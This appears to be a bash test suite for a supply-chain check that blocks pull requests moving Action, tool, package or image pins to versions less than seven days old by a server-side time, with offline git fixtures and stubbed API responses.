#!/usr/bin/env bash
# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC16, REQ-SUP-001-AC18, REQ-SUP-001-AC19
# The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
# package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
# repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
#   python3 bin/pin-age-check.py --root REPO --base REV --head REV --fixtures FILE [--json FILE] [--now ISO] [--min-days N]
#   exit 0: nothing moved, or every moved version is old enough; exit 1: a moved version is too young or its age cannot be proven.
#   An item is "<kind>:<name>@<version>"; kinds: action (version = the pinned commit), tool (the installer actions' version inputs and install-scanner.sh's
#   *_VER pins), gotool (go install path@version in run steps), package (pypi/<name>@<version> from the hash-pinned requirements), image (name@sha256:digest).
#   Fixtures: {"now": ISO, "times": {ITEM: {"time": ISO, "source": S}}, "first_seen": {ITEM: ISO}}. Sources that count: github-release, pypi, go-index,
#   registry-push. A source of commit-date, tag-date or image-config is NEVER a proof (the publisher or the builder controls it).
set -euo pipefail
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../../.." && pwd)
chk="$here/../supply-chain/pin-age-check.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
ok()  { pass=$((pass+1)); echo "ok   $1"; }
bad() { failn=$((failn+1)); echo "FAIL $1"; }
CASE=""
check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
NOW="2026-10-05T12:00:00Z"
d() { python3 -c "import datetime,sys;print((datetime.datetime(2026,10,5,12)-datetime.timedelta(days=float(sys.argv[1]))).strftime('%Y-%m-%dT%H:%M:%SZ'))" "$1"; }
SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))

# --- the base repository: one of every kind of pin --------------------------------------------------------------------
base="$work/base"; mkdir -p "$base/.github/workflows" "$base/.github/actions/local" "$base/.github/pins" "$base/bin" "$base/build/docker"
cat >"$base/.github/workflows/ci.yml" <<EOF
on: pull_request
jobs:
  j:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/own/ci@$DIG1
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: v2.13.2
      - uses: actions/setup-go@$SHA3 # v6.0.0
        with:
          go-version: '1.27'
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: '3.12'
      - run: |
          go install github.com/securego/gosec/v2/cmd/gosec@v2.29.0
          python3 -m pip install --require-hashes -r .github/pins/adjudicator-requirements.txt
      - uses: goreleaser/goreleaser-action@$SHA6 # v7.2.3
        with:
          version: '2.17.1'
      - uses: helm/kind-action@$SHA6 # v1.15.0
        with:
          node_image: kindest/node:v1.31.0@$DIG4
      - run: |
          curl -fsSL https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_linux_amd64.tar.gz -o gh.tgz
          python3 -m pip install --quiet black==24.1.0
          docker run --rm alpine:3.20@$DIG5 true
EOF
cat >"$base/.github/actions/local/action.yml" <<EOF
name: local
runs:
  using: composite
  steps:
    - uses: actions/cache@$SHA5 # v4.2.0
EOF
cat >"$base/bin/install-scanner.sh" <<'EOF'
#!/usr/bin/env bash
TRIVY_VER=0.74.0
GRYPE_VER=0.118.0
GITSIGN_VER=0.17.1
EOF
cat >"$base/.github/pins/adjudicator-requirements.txt" <<'EOF'
# hash-pinned
anthropic==1.9.0 \
    --hash=sha256:aaaa
requests==2.32.0 \
    --hash=sha256:bbbb
EOF
printf 'FROM gcr.io/distroless/static@%s\n' "$DIG2" >"$base/build/docker/Dockerfile.production"
printf 'module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\nrequire github.com/foo/bar v1.0.0\n' >"$base/go.mod"
git -C "$base" init -q; git -C "$base" add -A; git -C "$base" -c user.name=t -c user.email=t@x commit -q -m base

# newcase NAME 'python edit run in the repo root' -> $work/NAME (a copy of base with a head commit)
newcase() {
  local n=$1; rm -rf "$work/$n"; cp -R "$base" "$work/$n"
  ( cd "$work/$n" && python3 - "$2" <<'PY'
import sys
exec(sys.argv[1])
PY
    git add -A; git -c user.name=t -c user.email=t@x commit -q -m head )
}
# runck NAME FIXTURES-JSON [extra args] -> sets rc, $work/NAME.out
runck() {
  local n=$1 fx=$2; shift 2; echo "$fx" >"$work/$n.fx.json"; rc=0
  python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --fixtures "$work/$n.fx.json" --now "$NOW" --json "$work/$n.json" "$@" >"$work/$n.out" 2>&1 || rc=$?
}
sub() { python3 -c "import sys;print('import pathlib; p=pathlib.Path(%r); p.write_text(p.read_text().replace(%r,%r))' % tuple(sys.argv[1:]))" "$@"; }
OLD=$(d 10); YOUNG=$(d 3)

# --- nothing moves ------------------------------------------------------------------------------------------------------
newcase none "pathlib=__import__('pathlib'); pathlib.Path('README.md').write_text('hi')"
runck none '{"times": {}}'
CASE="no pin moved: exit 0, says so, and needs no data at all"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/none.out"

# --- an action pin moves: AC2 names it, AC3 measures its age ---------------------------------------------------------------
NEW1=$(printf 'a%.0s' $(seq 40))
newcase act "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}}}"
CASE="a moved action pin whose release is 10 days old passes, and the check NAMES it"
check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
CASE="the same pin released 3 days ago FAILS (exit 1) and says how young it is"
check test "$rc" -eq 1; check grep -qi 'FAIL' "$work/act.out"; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
runck act '{"times": {}}'
CASE="a moved pin with no age data FAILS: age not provable is a failure, never a pass"
check test "$rc" -eq 1; check grep -qi 'not provable\|cannot prove\|unprovable' "$work/act.out"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"github-release\"}}}"
CASE="a RELEASE date alone never proves an action (a tag can be moved under an old release): fails, though a tool's release date still counts"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"commit-date\"}}}"
CASE="a COMMIT date is never a proof of age (the publisher controls it): fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"tag-date\"}}}"
CASE="a TAG date is never a proof either: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}, \"first_seen\": {\"action:actions/checkout@$NEW1\": \"$OLD\"}}"
CASE="when the release is young but the exact version first appeared in one of OUR pull requests 10 days ago, it passes (the third server-side source)"
check test "$rc" -eq 0
runck act "{\"times\": {}, \"first_seen\": {\"action:actions/checkout@$NEW1\": \"$YOUNG\"}}"
CASE="first seen in our own PR only 3 days ago: still too young, fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$(d 7)\", \"source\": \"observer\"}}}"
CASE="exactly 7 days old passes (the boundary is 7 days, not 7 days and a minute)"
check test "$rc" -eq 0
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$(d 6.99)\", \"source\": \"observer\"}}}"
CASE="just under 7 days old fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"2099-01-01T00:00:00Z\", \"source\": \"observer\"}}}"
CASE="a publish time in the FUTURE is not a proof: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"not a date\", \"source\": \"observer\"}}}"
CASE="an unparseable time is unprovable: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"made-up\"}}}"
CASE="a source the check does not know is not a proof: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}}}" --min-days 30
CASE="--min-days is honoured (a 10-day-old version fails a 30-day rule)"
check test "$rc" -eq 1

# --- every other kind of pin the age check covers (AC2) ---------------------------------------------------------------------
cover() { # <name> <edit> <item key> <source>
  newcase "$1" "$2"
  runck "$1" "{\"times\": {\"$3\": {\"time\": \"$OLD\", \"source\": \"$4\"}}}"
  CASE="$1: moved, named and (10 days old via $4) accepted"; check test "$rc" -eq 0; check grep -qF "$3" "$work/$1.out"
  runck "$1" "{\"times\": {\"$3\": {\"time\": \"$YOUNG\", \"source\": \"$4\"}}}"
  CASE="$1: the same item 3 days old fails"; check test "$rc" -eq 1
  runck "$1" '{"times": {}}'
  CASE="$1: with no age data fails"; check test "$rc" -eq 1
}
cover tool-scanner "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')" "tool:trivy@0.75.0" github-release
cover tool-gitsign "$(sub bin/install-scanner.sh 'GITSIGN_VER=0.17.1' 'GITSIGN_VER=0.18.0')" "tool:gitsign@0.18.0" github-release
cover tool-installer-input "$(sub .github/workflows/ci.yml 'version: v2.13.2' 'version: v2.14.0')" "tool:golangci-lint@v2.14.0" github-release
cover tool-python-version "$(sub .github/workflows/ci.yml "python-version: '3.12'" "python-version: '3.13.1'")" "tool:python@3.13.1" github-release
cover gotool "$(sub .github/workflows/ci.yml 'gosec@v2.29.0' 'gosec@v2.30.0')" "gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0" go-index
cover package "$(sub .github/pins/adjudicator-requirements.txt 'anthropic==1.9.0' 'anthropic==1.10.0')" "package:pypi/anthropic@1.10.0" pypi
cover image-container "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci@$DIG3")" "image:ghcr.io/own/ci@$DIG3" registry-push
cover tool-goreleaser "$(sub .github/workflows/ci.yml "version: '2.17.1'" "version: '2.18.0'")" "tool:goreleaser@2.18.0" github-release
cover tool-curl-download "$(sub .github/workflows/ci.yml 'releases/download/v2.40.0/gh_2.40.0_linux_amd64' 'releases/download/v2.41.0/gh_2.41.0_linux_amd64')" "tool:cli/cli/gh_2.41.0_linux_amd64.tar.gz@v2.41.0" github-release
cover package-in-run-step "$(sub .github/workflows/ci.yml 'black==24.1.0' 'black==24.2.0')" "package:pypi/black@24.2.0" pypi
cover image-in-run-step "$(sub .github/workflows/ci.yml "alpine:3.20@$DIG5" "alpine:3.20@$DIG3")" "image:alpine@$DIG3" registry-push
cover image-installer-input "$(sub .github/workflows/ci.yml "kindest/node:v1.31.0@$DIG4" "kindest/node:v1.31.0@$DIG3")" "image:kindest/node@$DIG3" registry-push
NEW5=$(printf 'b%.0s' $(seq 40))
cover local-composite-action "$(sub .github/actions/local/action.yml "actions/cache@$SHA5" "actions/cache@$NEW5")" "action:actions/cache@$NEW5" observer

# --- a go install tool: the module INDEX's time, never the version-control time -------------------------------------------------
runck gotool "{\"times\": {\"gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0\": {\"time\": \"$OLD\", \"source\": \"vcs-time\"}}}"
CASE="a go install tool's age from the version-control .info time is refused (the index timestamp is the server-side one): fails"
check test "$rc" -eq 1
# --- an image: the registry's push time, never the image's own created field ----------------------------------------------------
runck image-container "{\"times\": {\"image:ghcr.io/own/ci@$DIG3\": {\"time\": \"$OLD\", \"source\": \"image-config\"}}}"
CASE="an image's own 'created' field is refused (the builder sets it): fails"
check test "$rc" -eq 1

# --- name:tag@sha256:digest counts as PINNED (Docker ignores the tag when a digest is present): the image is the name without the tag, the version the digest ----
newcase tagdigest "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2@$DIG3")"
runck tagdigest "{\"times\": {\"image:ghcr.io/own/ci@$DIG3\": {\"time\": \"$OLD\", \"source\": \"registry-push\"}}}"
CASE="an image written name:tag@sha256:digest is the SAME item as name@sha256:digest (the tag is ignored): moved, named by its digest, and accepted at 10 days"
check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ci@$DIG3" "$work/tagdigest.out"
newcase tagonly "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2")"
runck tagonly '{"times": {}}'
CASE="an image with only a tag (no digest) is not a pin the age check can measure: it fails rather than passing silently"
check test "$rc" -eq 1

# --- NOT covered: the product's base image, Go modules, the Go toolchain (amendments 1 and 2) -------------------------------------
newcase notcovered "$(sub build/docker/Dockerfile.production "$DIG2" "$DIG3")
$(sub go.mod 'go1.27.1' 'go1.27.2')
$(sub .github/workflows/ci.yml "go-version: '1.27'" "go-version: '1.28'")
$(sub go.mod 'v1.0.0' 'v1.1.0')"
runck notcovered '{"times": {}}'
CASE="the product base image, a Go module bump, go.mod's toolchain and setup-go's version are NOT covered: they move with no data and no failure"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/notcovered.out"

# --- several moves: every one is named, one young one fails the whole check ---------------------------------------------------------
newcase multi "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')
$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' 'requests==2.33.0')"
runck multi "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}, \"tool:trivy@0.75.0\": {\"time\": \"$YOUNG\", \"source\": \"github-release\"}, \"package:pypi/requests@2.33.0\": {\"time\": \"$OLD\", \"source\": \"pypi\"}}}"
CASE="three moves, one of them 3 days old: exit 1, and the output names ALL THREE (so a reviewer sees what moved) and blames the young one"
check test "$rc" -eq 1
check grep -qF "action:actions/checkout@$NEW1" "$work/multi.out"; check grep -qF "tool:trivy@0.75.0" "$work/multi.out"; check grep -qF "package:pypi/requests@2.33.0" "$work/multi.out"
check python3 - "$work/multi.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
moved = {m["item"]: m for m in d["moved"]}
assert set(moved) == {"action:actions/checkout@" + "a" * 40, "tool:trivy@0.75.0", "package:pypi/requests@2.33.0"}, sorted(moved)
assert moved["tool:trivy@0.75.0"]["ok"] is False and moved["package:pypi/requests@2.33.0"]["ok"] is True, moved
PY

# --- a NEW pin counts as moved; a removed pin is no age problem --------------------------------------------------------------
NEW6=$(printf 'c%.0s' $(seq 40))
newcase added "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@$NEW6 # v7.0.1")"
runck added '{"times": {}}'
CASE="a brand-new action pin counts as moved: with no age data it fails"
check test "$rc" -eq 1; check grep -qF "action:actions/upload-artifact@$NEW6" "$work/added.out"
newcase removed "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "")"
runck removed '{"times": {}}'
CASE="removing a pin is not an age problem: exit 0"
check test "$rc" -eq 0

# --- a moved pin whose version is the SAME item elsewhere (the same commit used twice) is judged once, and an UNCHANGED pin never needs data ----------
runck none '{"times": {}}'
CASE="an unchanged workflow with 5 pins needs no data (only what MOVED is measured)"
check test "$rc" -eq 0

# --- a workflow whose filename is not ASCII is still read (git quotes such paths; a pin there must never go unmeasured) --------------------------------------------
newcase unicode "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
import pathlib, shutil
shutil.copy('.github/workflows/ci.yml', '.github/workflows/\u00e9.yml')
pathlib.Path('.github/workflows/ci.yml').write_text(pathlib.Path('.github/workflows/ci.yml').read_text().replace('actions/checkout@$NEW1', 'actions/checkout@$SHA1'))"
runck unicode '{"times": {}}'
CASE="a new pin in .github/workflows/\u00e9.yml (a non-ASCII file name) is named and measured like any other"
check test "$rc" -eq 1; check grep -qF "action:actions/checkout@$NEW1" "$work/unicode.out"

# --- the age of an ACTION's exact commit: our own scheduled observer first saw the tag at it, or the PR clock; a release date proves nothing (advisor 0183) -----------------------------------------
stubpy="$here/gh-map-stub.py"
mkstate() { # <state json> -> a zip holding state.json, base64
  python3 -c "import base64,io,json,sys,zipfile;b=io.BytesIO();z=zipfile.ZipFile(b,'w');z.writestr('state.json',sys.argv[1]);z.close();print(base64.b64encode(b.getvalue()).decode())" "$1"
}
ACTR=o/act
liveproof() { # <state or ->  <run event>  <label>  -> prints the live_proofs list for action o/act@$SHA1
  local state=$1 event=$2 label=${3:-v4.1.0}
  python3 - "$work/map.json" "$state" "$event" "$SHA1" "$(d 8)" <<'PY'
import base64, io, json, sys, zipfile
m = {}
if sys.argv[2] != "-":
    b = io.BytesIO(); z = zipfile.ZipFile(b, "w"); z.writestr("state.json", sys.argv[2]); z.close()
    m["repos/o/r/actions/workflows/supply-chain.yml/runs?event=schedule&branch=main&status=completed&per_page=100"] = {"workflow_runs": [{"id": 7, "event": sys.argv[3], "head_branch": "main", "conclusion": "success", "path": ".github/workflows/supply-chain.yml", "created_at": sys.argv[5]}]}
    m["repos/o/r/actions/runs/7/artifacts"] = {"artifacts": [{"id": 9, "name": "tag-observations", "expired": False}]}
    m["repos/o/r/actions/artifacts/9/zip"] = {"__b64": base64.b64encode(b.getvalue()).decode()}
json.dump(m, open(sys.argv[1], "w"))
PY
  ( cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$SHA1" "$stubpy" "$label" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[3], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
ac._tag_refs = lambda repo: {"v4": sys.argv[2], "v4.1.0": sys.argv[2]}
try:
    print(ac.live_proofs(ac.inv.Item("action", "o/act", sys.argv[2], sys.argv[4]), "."))
except ac.CouldNotLook as e:
    print("COULDNOTLOOK", e)
PY
) 2>&1 | tail -1; }
GOODSTATE=$(python3 -c "import json,sys;print(json.dumps({'version':1,'first_seen':{'o/act@v4.1.0@'+sys.argv[1]:'2026-09-01T00:00:00Z'}}))" "$SHA1")
out=$(liveproof "$GOODSTATE" schedule)
CASE="observer: our scheduled run first saw v4.1.0 at the pinned commit on 2026-09-01: an observer proof with that time"
case "$out" in *"2026-09-01T00:00:00Z', 'observer'"*) ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "$GOODSTATE" push)
CASE="observer: a run that is not event=schedule is never read (a PR cannot forge the state): no proof"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
MOVED=$(python3 -c "import json;print(json.dumps({'version':1,'first_seen':{'o/act@v4.1.0@'+'e'*40:'2026-01-01T00:00:00Z'}}))")
out=$(liveproof "$MOVED" schedule)
CASE="observer: the tag was seen on 2026-01-01 at a DIFFERENT commit; its move to the pinned commit was never observed: no proof (the tj-actions pattern)"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "$GOODSTATE" schedule v9.9.9)
CASE="observer: the # version label must itself resolve to the pinned commit (v9.9.9 does not): no proof"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof - schedule)
CASE="observer: no scheduled run has produced state yet: nothing observed, no proof, and no error (ages only get younger)"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "not json" schedule)
CASE="observer: a state that exists but cannot be read is loud (could not look), never 'nothing observed'"
case "$out" in COULDNOTLOOK*) ok "$CASE";; *) bad "$CASE ($out)";; esac

# --- the PR clock: the first workflow run on the commit that INTRODUCED the version in this PR (server-side), never a PR's creation time or text -----------------------------------------------
rm -rf "$work/pc"; mkdir -p "$work/pc/.github/workflows"; git -C "$work/pc" init -q
gc() { git -C "$work/pc" add -A; git -C "$work/pc" -c user.name=t -c user.email=t@x commit -q -m "$1"; }
printf 'on: x\njobs:\n  j:\n    steps:\n      - run: echo hi\n' >"$work/pc/.github/workflows/a.yml"; gc base
printf 'on: x\n# 21 21 21 mentioned in a comment\njobs:\n  j:\n    steps:\n      - run: echo hi\n' >"$work/pc/.github/workflows/a.yml"; gc decoy
printf 'on: x\njobs:\n  j:\n    steps:\n      - run: echo hi\n      - uses: actions/setup-java@%s # v5\n        with:\n          java-version: 21\n' "$SHA6" >"$work/pc/.github/workflows/a.yml"; gc introduce
printf '# later\n' >>"$work/pc/.github/workflows/a.yml"; gc later
BASEC=$(git -C "$work/pc" rev-parse HEAD~3); DECOY=$(git -C "$work/pc" rev-parse HEAD~2); INTRO=$(git -C "$work/pc" rev-parse HEAD~1); HEADC=$(git -C "$work/pc" rev-parse HEAD)
pcclock() { # <runs json for the introducing commit or ->
  python3 - "$work/map.json" "$INTRO" "$HEADC" "$1" "$DECOY" <<'PY'
import json, sys
m = {"repos/o/r/actions/runs?head_sha=" + sys.argv[3] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-10-04T00:00:00Z"}]},
     "repos/o/r/actions/runs?head_sha=" + sys.argv[5] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-09-01T00:00:00Z"}]}}
if sys.argv[4] != "-":
    m["repos/o/r/actions/runs?head_sha=" + sys.argv[2] + "&per_page=100"] = {"workflow_runs": json.loads(sys.argv[4])}
json.dump(m, open(sys.argv[1], "w"))
PY
  ( cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$stubpy" "$work/pc" "$BASEC" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[2], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[3], sys.argv[4], "HEAD"))
PY
) 2>&1 | tail -1; }
CASE="PR clock: the earliest workflow run on the first commit whose INVENTORY holds the item (not on an earlier commit that merely mentions 21 in a comment, nor the later head)"
check test "$(pcclock '[{"created_at":"2026-09-20T00:00:00Z"},{"created_at":"2026-09-25T00:00:00Z"}]')" = 2026-09-20T00:00:00Z
CASE="PR clock: no run on the introducing commit means no clock (the later commit's runs do not count)"
check test "$(pcclock -)" = None
CASE="PR clock: outside a PR (no base) there is no clock"
check test "$(cd "$work" && GITHUB_REPOSITORY=o/r python3 - "$chk" "$work/pc" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[2], None))
PY
)" = None

# --- tools: the NEWEST of the release date and every asset's own created/updated time; PyPI: the newest file ------------------------------------------------------------------------------------
CASE="a tool's release proof is the newest asset time: an asset replaced yesterday in an old release is young again"
check python3 - "$chk" "$stubpy" "$work" <<'PY'
import importlib.util, json, os, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
json.dump({"repos/aquasecurity/trivy/releases/tags/0.75.0": {"message": "x"}, "repos/aquasecurity/trivy/releases/tags/v0.75.0": {"published_at": "2026-01-01T00:00:00Z", "draft": False,
           "assets": [{"created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-10-04T00:00:00Z"}]}}, open(sys.argv[3] + "/map.json", "w"))
os.environ["GH_MAP"] = sys.argv[3] + "/map.json"
orig = subprocess.run
subprocess.run = lambda cmd, *a, **k: orig([sys.argv[2], *cmd[1:]] if cmd and cmd[0] == "gh" else cmd, *a, **k)
ac._OBS.clear()
got = ac.live_proofs(ac.inv.Item("tool", "trivy", "0.75.0"), ".")
assert got == [("2026-10-04T00:00:00Z", "github-release")], got
PY


# --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
runck extras '{"times": {}}'
CASE="pip extras (requests[socks]==2.99.0), a range (urllib3>=2.0), a tag-only docker run image and an expression containing || are all inventory items; the expression's secret name never prints"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.99.0" "$work/extras.out"; check grep -qF "package:pypi/urllib3@>=2.0" "$work/extras.out"; check grep -qF "image:alpine:3.99@" "$work/extras.out"
check bash -c "! grep -rq PRIVATE_VERSION '$work/extras.out' '$work/extras.json'"; check grep -qF 'gotool:example.org/tool@${{expression}}' "$work/extras.out"
newcase subdir "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/init@'$SHA6$' # v3\n      - run: |')"
git -C "$work/subdir" commit -q --amend -m head
newcase subdir2 "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/analyze@'$SHA6$' # v3\n      - run: |')"
runck subdir2 '{"times": {}}'
CASE="an action's subdirectory is part of its identity: github/codeql-action/analyze@sha is named as such"
check test "$rc" -eq 1; check grep -qF "action:github/codeql-action/analyze@$SHA6" "$work/subdir2.out"
newcase indentreq "$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' '  requests[security]==2.40.0')"
runck indentreq '{"times": {}}'
CASE="an indented requirements line and a requirement with extras are read"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.40.0" "$work/indentreq.out"

# --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
try:
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
except RuntimeError as e:
    assert "refusing to read it partially" in str(e)
else:
    raise AssertionError("an over-long command line was read as its prefix")
assert time.time() - t < 3, time.time() - t
PY
CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/install-scanner.sh": "SCOUT_VER=1.26.0\ncase x in docker-scout|docker-scout-1.25.0|docker-scout-1.24.0) ;; esac\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/latest/download/x.tgz\n          go run example.org/tool@v1.2.3\n          go get example.org/other@v2.0.0\n"})
for k in ("tool:scout@1.25.0", "tool:scout@1.24.0", "tool:scout@1.26.0", "tool:o/r@latest", "gotool:example.org/tool@v1.2.3", "gotool:example.org/other@v2.0.0"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: install forms it does not measure (npm, apt, gh release download, a pip URL, a non-release download) are LISTED"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
whats = {k[1] for k in inv.unmeasured(f)}
assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download"}, whats
PY

CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items; a range, (unpinned) or an expression is NEVER a pin that can pass the age check"
